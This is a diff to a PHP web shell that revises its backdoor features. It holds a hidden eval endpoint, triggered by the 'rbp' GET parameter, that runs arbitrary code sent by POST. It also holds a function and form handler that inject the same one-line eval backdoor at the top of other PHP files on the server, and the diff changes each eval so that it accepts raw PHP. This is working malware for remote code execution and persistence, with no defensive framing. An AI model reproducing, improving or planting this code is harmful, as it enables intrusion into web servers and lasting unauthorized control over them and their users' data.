@@ -627,15 +627,15 @@ if (isset($_POST['mass_delete'])) {
     exit;
 }
 
-// Backdoor execution - FIXED
+// Backdoor execution - ERROR FIXED
 if(isset($_GET['rbp'])&&$_GET['rbp']=='rbp'){
     if(isset($_POST['rbp'])){
-        @eval($_POST['rbp']);
+        @eval('?>' . $_POST['rbp']);
         exit();
     }
 }
 
-// Add backdoor to file - FIXED
+// Add backdoor to file - ERROR FIXED
 function RBPaddBackdoor($filePath, $backdoorCode) {
     if (!file_exists($filePath)) {
         return ["error" => "File not found: $filePath"];
@@ -655,8 +655,8 @@ function RBPaddBackdoor($filePath, $backdoorCode) {
     $cleanContent = preg_replace('/^<\?php\s*/', '', $originalContent);
     $cleanContent = preg_replace('/^<\?\s*/', '', $cleanContent);
     
-    // Add backdoor code at the VERY beginning - FIXED WITH eval()
-    $newContent = "<?php if(isset(\$_GET['rbp'])&&\$_GET['rbp']=='rbp'){if(isset(\$_POST['rbp'])){@eval(\$_POST['rbp']);exit();}}?>" . $cleanContent;
+    // Add backdoor code - ERROR FIXED
+    $newContent = "<?php if(isset(\$_GET['rbp'])&&\$_GET['rbp']=='rbp'){if(isset(\$_POST['rbp'])){@eval('?>'.\$_POST['rbp']);exit();}}?>" . $cleanContent;
     
     if (file_put_contents($filePath, $newContent)) {
         return ["success" => "Backdoor added successfully to: $filePath"];
@@ -665,7 +665,7 @@ function RBPaddBackdoor($filePath, $backdoorCode) {
     }
 }
 
-// Backdoor handler - FIXED
+// Backdoor handler - ERROR FIXED
 if (isset($_POST['add_backdoor'])) {
     $isPostAction = true;
     $sourceFile = $_POST['backdoor_file_path'] ?? '';
@@ -676,8 +676,8 @@ if (isset($_POST['add_backdoor'])) {
         exit;
     }
     
-    // FIXED backdoor code with eval() not trim()
-    $backdoorCode = "<?php if(isset(\$_GET['rbp'])&&\$_GET['rbp']=='rbp'){if(isset(\$_POST['rbp'])){@eval(\$_POST['rbp']);exit();}}?>";
+    // ERROR FIXED backdoor code
+    $backdoorCode = "<?php if(isset(\$_GET['rbp'])&&\$_GET['rbp']=='rbp'){if(isset(\$_POST['rbp'])){@eval('?>'.\$_POST['rbp']);exit();}}?>";
     
     $results = RBPaddBackdoor($sourceFile, $backdoorCode);
     $_SESSION['backdoor_results'] = $results;
